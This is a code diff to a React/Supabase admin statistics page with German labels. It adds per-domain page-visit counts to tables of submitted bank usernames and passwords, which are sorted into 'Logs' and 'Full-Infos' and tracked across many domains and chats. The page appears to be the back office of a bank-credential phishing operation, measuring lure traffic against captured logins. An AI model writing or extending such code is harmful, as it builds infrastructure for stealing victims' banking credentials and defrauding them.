@@ -4,9 +4,10 @@ import { supabase } from "@/integrations/supabase/client";
 import AdminLayout from "@/components/AdminLayout";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
 import { Badge } from "@/components/ui/badge";
-import { BarChart3, Globe, Send, Users, FileText, KeyRound } from "lucide-react";
+import { BarChart3, Globe, Send, Users, FileText, KeyRound, Eye } from "lucide-react";
 
 interface SubRow { domain: string | null; bank_username: string | null; bank_password: string | null; }
+interface VisitRow { domain: string | null; }
 interface ChatRow { id: string; chat_id: string; label: string | null; domains: string[]; }
 
 function StatisticsContent() {
@@ -43,6 +44,27 @@ function StatisticsContent() {
     },
   });
 
+  const { data: visits = [] } = useQuery({
+    queryKey: ["stats-page-visits"],
+    queryFn: async () => {
+      const all: VisitRow[] = [];
+      let from = 0;
+      const PAGE = 1000;
+      while (true) {
+        const { data, error } = await supabase
+          .from("page_visits")
+          .select("domain")
+          .range(from, from + PAGE - 1);
+        if (error) throw error;
+        const rows = (data || []) as VisitRow[];
+        all.push(...rows);
+        if (rows.length < PAGE) break;
+        from += PAGE;
+      }
+      return all;
+    },
+  });
+
   const isLog = (s: SubRow) => !!(s.bank_username && s.bank_password);
 
   const totals = useMemo(() => {
@@ -70,18 +92,33 @@ function StatisticsContent() {
     return map;
   }, [chats]);
 
+  const visitsByDomain = useMemo(() => {
+    const map = new Map<string, number>();
+    for (const v of visits) {
+      const d = v.domain || "(ohne Domain)";
+      map.set(d, (map.get(d) || 0) + 1);
+    }
+    return map;
+  }, [visits]);
+
   const domainStats = useMemo(() => {
-    const map = new Map<string, { domain: string; total: number; logs: number; full: number }>();
+    const map = new Map<string, { domain: string; total: number; logs: number; full: number; visits: number }>();
     for (const s of submissions) {
       const d = s.domain || "(ohne Domain)";
-      const entry = map.get(d) || { domain: d, total: 0, logs: 0, full: 0 };
+      const entry = map.get(d) || { domain: d, total: 0, logs: 0, full: 0, visits: 0 };
       entry.total++;
       if (isLog(s)) entry.logs++;
       else entry.full++;
       map.set(d, entry);
     }
-    return Array.from(map.values()).sort((a, b) => b.total - a.total);
-  }, [submissions]);
+    // Include domains that have visits but no submissions yet
+    for (const [d, count] of visitsByDomain) {
+      const entry = map.get(d) || { domain: d, total: 0, logs: 0, full: 0, visits: 0 };
+      entry.visits = count;
+      map.set(d, entry);
+    }
+    return Array.from(map.values()).sort((a, b) => b.visits - a.visits || b.total - a.total);
+  }, [submissions, visitsByDomain]);
 
 
   const chatStats = useMemo(() => {
@@ -105,6 +142,7 @@ function StatisticsContent() {
   }, [chats, submissions]);
 
   const statCards = [
+    { label: "Besuche", value: visits.length, icon: Eye, color: "text-purple-700 bg-purple-50 border-purple-200" },
     { label: "Gesamt", value: totals.total, icon: Users, color: "text-slate-600 bg-slate-50 border-slate-200" },
     { label: "Logs", value: totals.logs, icon: KeyRound, color: "text-emerald-700 bg-emerald-50 border-emerald-200" },
     { label: "Full-Infos", value: totals.full, icon: FileText, color: "text-amber-700 bg-amber-50 border-amber-200" },
@@ -123,7 +161,7 @@ function StatisticsContent() {
       </div>
 
       {/* Stat Cards */}
-      <div className="grid grid-cols-2 md:grid-cols-5 gap-3">
+      <div className="grid grid-cols-2 md:grid-cols-6 gap-3">
         {statCards.map((c) => (
           <div key={c.label} className={`rounded-xl border p-4 ${c.color}`}>
             <div className="flex items-center justify-between">
@@ -146,6 +184,7 @@ function StatisticsContent() {
           <TableHeader>
             <TableRow className="bg-slate-50/80 border-b border-slate-100">
               <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider pl-4">Domain</TableHead>
+              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider text-right">Besuche</TableHead>
               <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider text-right">Logs</TableHead>
               <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider text-right">Full-Infos</TableHead>
               <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider text-right pr-4">Gesamt</TableHead>
@@ -163,6 +202,9 @@ function StatisticsContent() {
                   </div>
                 </TableCell>
                 <TableCell className="text-right">
+                  <Badge variant="outline" className="border-purple-200 bg-purple-50 text-purple-700 text-[10px] font-medium">{d.visits}</Badge>
+                </TableCell>
+                <TableCell className="text-right">
                   <Badge variant="outline" className="border-emerald-200 bg-emerald-50 text-emerald-700 text-[10px] font-medium">{d.logs}</Badge>
                 </TableCell>
                 <TableCell className="text-right">
@@ -172,7 +214,7 @@ function StatisticsContent() {
               </TableRow>
             ))}
             {domainStats.length === 0 && (
-              <TableRow><TableCell colSpan={4} className="text-center text-slate-400 py-12">Keine Einträge</TableCell></TableRow>
+              <TableRow><TableCell colSpan={5} className="text-center text-slate-400 py-12">Keine Einträge</TableCell></TableRow>
             )}
           </TableBody>
         </Table>
